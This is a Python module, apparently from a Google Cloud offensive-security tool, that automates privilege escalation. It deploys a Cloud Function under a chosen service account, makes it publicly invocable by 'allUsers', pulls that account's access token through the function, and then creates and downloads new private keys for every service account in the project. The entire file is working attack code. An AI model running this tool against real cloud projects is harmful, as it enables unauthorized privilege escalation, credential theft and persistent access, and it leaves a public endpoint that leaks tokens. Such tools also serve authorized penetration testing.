"""
Author:         Anirban Das
                github.com/anrbn
                linkedin.com/in/anrbnds

Command:        privesc function-deploy
Description:    Deploys a Cloud Function to Privilege Escalate.
Explained:      Deploys a Cloud Function and assigns a default or specified Service Account to it, then uses the assigned Service Account's access_token to download every Service Account or specified Service Account Key in the Project.
"""
import os, time, requests, secrets, json, base64
import colorama, platform

import google.auth
from googleapiclient import discovery
from google.auth.transport.requests import AuthorizedSession
from google.oauth2 import service_account
import google.oauth2.credentials

from googleapiclient.discovery import build


if os.path.exists("/.dockerenv"):
    output_dir = "/tmp/GATOR/download/Privilege Escalation/Cloud Functions/function-deploy"
#elif platform.system() == "Windows":
    #output_dir = "./download/Persistence/Cloud IAM/service-account-keys"
else:
    output_dir = "./download/Privilege Escalation/Cloud Functions/function-deploy"

os.makedirs(output_dir, exist_ok=True)


if platform.system() == "Windows":
    colorama.init()

RESET = colorama.Style.RESET_ALL
BOLD = colorama.Style.BRIGHT
RED = colorama.Fore.RED
GREEN = colorama.Fore.GREEN
YELLOW = colorama.Fore.YELLOW
MAGENTA = colorama.Fore.MAGENTA
BG_YELLOW = colorama.Back.YELLOW


def run_module(project_id, serviceaccountpath, active_access_token, bucket_name=None, account=None, sadownload=None):
    output = ""

    try:
        def upload_to_public_gcp_bucket(zip_path, BUCKET_NAME, destination_blob_name):
            output = ""
            output += f"\n{GREEN}+ Uploading the function.zip file to Cloud Storage{RESET}\n"
            try:
                url = f"https://storage.googleapis.com/{BUCKET_NAME}/{destination_blob_name}"

                with open(zip_path, "rb") as zip_file:
                    response = requests.put(url, data=zip_file, headers={"Content-Type": "application/zip"})
                    
                if response.status_code == 200:
                    output += f"  {zip_path} uploaded to the Bucket: {BUCKET_NAME}.\n"
                    output += f"  gsutil link: gs://{BUCKET_NAME}/{destination_blob_name}.\n"
                    
                else:
                    output += f"{RED}  Error uploading {zip_path}: {response.status_code} {response.reason}{RESET}\n"
            
            except Exception as e:
                output += f"{RED}  An error occurred: {str(e)}{RESET}"
                return output        
            return output


        def set_public_access(project_id, serviceaccountpath, active_access_token, function_name, sadownload):
            output = ""
            output += f"\n{GREEN}+ Cloud Function Permission{RESET}\n"
            try:
                if serviceaccountpath is not None:
                    creds = service_account.Credentials.from_service_account_file(serviceaccountpath)
                elif active_access_token is not None:
                    creds = google.oauth2.credentials.Credentials(active_access_token)
                else:
                    output += f"{RED}  No valid authentication method provided.{RESET}\n"
                    return output

                authed_session = AuthorizedSession(creds)
                service = discovery.build('cloudfunctions', 'v1', credentials=creds)
                name = "projects/{}/locations/us-central1/functions/{}".format(project_id, function_name)
                
                policy = {
                    "bindings": [
                        {
                            "role": "roles/cloudfunctions.invoker",
                            "members": ["allUsers"]
                        }
                    ]
                }
                
                request = service.projects().locations().functions().setIamPolicy(
                    resource=name,
                    body={
                        'policy': policy,
                    }
                )

                response = request.execute()
                output += f"  Cloud Function Invoker role granted to 'allUsers' for {function_name}.\n"
                get_print =  get_and_print_access_token(project_id, function_name, sadownload)
                output += get_print

            except Exception as e:
                output += f"{RED}  An error occurred: {str(e)}{RESET}"
                return output
            return output


        def get_and_print_access_token(project_id, function_name, sadownload):
            output = ""
            output += f"\n{GREEN}+ Grabbing the Privileged Access Token{RESET}\n"
            try:
                url = f"https://us-central1-{project_id}.cloudfunctions.net/{function_name}"
                response = requests.get(url)
                if response.status_code == 200:
                    json_data = response.json()
                    access_t = json_data.get("access_token")
                    if access_t:
                        output += f"  Access Token: {access_t}\n" 
                        dwnserv_acc = download_service_account_keys(project_id, access_t, sadownload)
                        output += dwnserv_acc
                    else:
                        output += f"{RED}  Error: The 'access_token' key is not present in the response.{RESET}\n"
                else:
                    output += f"{RED}  Error: The request to {url} returned status code {response.status_code}.{RESET}\n"
            
            except Exception as e:
                output += f"{RED}  An error occurred: {str(e)}{RESET}"
                return output

            return output
 

        def download_service_account_keys(project_id, access_t, sadownload=None):
            output = ""
            output += f"\n{GREEN}+ Service Account Key(s) Download{RESET}\n"
            try:
                creds = google.oauth2.credentials.Credentials(access_t)
                service = build('iam', 'v1', credentials=creds)

                response = service.projects().serviceAccounts().list(name=f'projects/{project_id}').execute()
                all_accounts = [account['email'] for account in response['accounts']]

                if sadownload == 'default' or sadownload is None:
                    accounts_to_download = all_accounts
                else:
                    if sadownload in all_accounts:
                        accounts_to_download = [sadownload]
                    else:
                        output += f"{RED}  The Service Account: {sadownload} doesn't exist.{RESET}"
                        return output
                    

                for account_email in accounts_to_download:
                    key = service.projects().serviceAccounts().keys().create(
                        name=f'projects/{project_id}/serviceAccounts/{account_email}',
                        body={'keyAlgorithm': 'KEY_ALG_RSA_2048'}
                    ).execute()

                    key_data = key['privateKeyData']
                    decoded_key_data = base64.b64decode(key_data)
                    json_key_data = json.loads(decoded_key_data)

                    with open(f'{output_dir}/{account_email}-key.json', 'w') as key_file:
                        json.dump(json_key_data, key_file, indent=2)

                    output += (f"  Successfully downloaded key for Service Account: {account_email}.\n")
                    output += (f"  Directory: {output_dir}\n")
                  
            except Exception as e:
                if 'Permission' in str(e) and 'denied' in str(e):
                    output += f"{RED}  The Service Account in use by the Function doesn't have enough permission.{RESET}"
                else:
                    output += f"{RED}  An error occurred: {str(e)}{RESET}"
                return output
            
            return output

        def deploy_cloud_function(project_id, serviceaccountpath, active_access_token, location, entry_point, runtime, source_code_uri, account=None, sadownload=None):
            output = ""
            output += f"\n{GREEN}+ Cloud Function Deploy{RESET}\n"

            try:
                if serviceaccountpath is not None:
                    creds = service_account.Credentials.from_service_account_file(serviceaccountpath)
                elif active_access_token is not None:
                    creds = google.oauth2.credentials.Credentials(active_access_token)
                else:
                    output += f"{RED}  No valid authentication method provided.{RESET}\n"
                    return output
            
                authed_session = AuthorizedSession(creds)
                service = discovery.build('cloudfunctions', 'v1', credentials=creds)
                parent = f"projects/{project_id}/locations/{location}"
                function_name = "func_" + secrets.token_hex(4)
                if account == 'default':
                    function = {
                        "name": f"{parent}/functions/{function_name}",
                        "entryPoint": entry_point,
                        "runtime": runtime,
                        "sourceArchiveUrl": source_code_uri,
                        "httpsTrigger": {},
                    }
                else:
                    function = {
                        "name": f"{parent}/functions/{function_name}",
                        "entryPoint": entry_point,
                        "runtime": runtime,
                        "serviceAccountEmail": account,
                        "sourceArchiveUrl": source_code_uri,
                        "httpsTrigger": {},
                    }
                request = service.projects().locations().functions().create(
                    location=parent,
                    body=function
                )
                operation = request.execute()
                output += f"  Deploying Cloud Function {function_name}.\n"
                time.sleep(90)

                function_url = f"https://{location}-{project_id}.cloudfunctions.net/{function_name}"
                response = requests.get(function_url)
                if "The requested URL was not found on this server." in response.text:
                    output += f"  Function Deployment Failed."
                else:
                    output += f"  Cloud Function: {function_name} deployed successfully.\n"  
                    output += f"  Function URL: {function_url}\n"             

                public_access = set_public_access(project_id, serviceaccountpath, active_access_token, function_name, sadownload)
                output += public_access

            except Exception as e:
                output += f"{RED}  An error occurred: {str(e)}{RESET}"
                return output

            return output


        zip_path = os.path.join(".", "misc", "function-source.zip")
        BUCKET_NAME = bucket_name
        destination_blob_name = "function-source.zip"

        upload_output = upload_to_public_gcp_bucket(zip_path, BUCKET_NAME, destination_blob_name)
        output += upload_output

        project_id = project_id
        location = "us-central1"
        entry_point = "anirban"
        runtime = "python38"
        source_code_uri = f"gs://{BUCKET_NAME}/{destination_blob_name}"

        deploy_output = deploy_cloud_function(project_id, serviceaccountpath, active_access_token, location, entry_point, runtime, source_code_uri, account=account, sadownload=sadownload)
        output += deploy_output
    
    except Exception as e:
        output += f"{RED} An error occurred: {str(e)}{RESET}"
        return output
    
    return output